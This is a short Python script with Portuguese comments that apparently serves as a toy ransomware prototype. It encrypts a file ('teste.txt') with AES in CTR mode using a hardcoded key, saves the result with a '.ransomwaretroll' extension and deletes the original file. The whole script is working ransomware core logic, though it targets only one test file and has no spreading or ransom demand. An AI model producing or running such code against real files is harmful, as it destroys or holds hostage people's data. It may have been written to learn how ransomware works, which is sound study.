import os
import pyaes

def criptografar_arquivo(file_name: str, key: bytes):
    """Criptografa um arquivo usando AES em modo CTR e salva o resultado em um novo arquivo."""
    
    # Lê o conteúdo do arquivo original
    with open(file_name, 'rb') as file:
        file_data = file.read()

    # Criptografa os dados do arquivo
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Define o nome do novo arquivo criptografado
    new_file_name = f"{file_name}.ransomwaretroll"

    # Salva o arquivo criptografado
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    # Remove o arquivo original após a criptografia
    os.remove(file_name)

    print(f"Arquivo criptografado com sucesso: {new_file_name}")

if __name__ == "__main__":
    # Nome do arquivo a ser criptografado
    file_name = "teste.txt"
    
    # Chave de criptografia (deve ser 16, 24 ou 32 bytes)
    key = b"testeransomwares"  # Chave de 16 bytes

    # Criptografa o arquivo
    criptografar_arquivo(file_name, key)
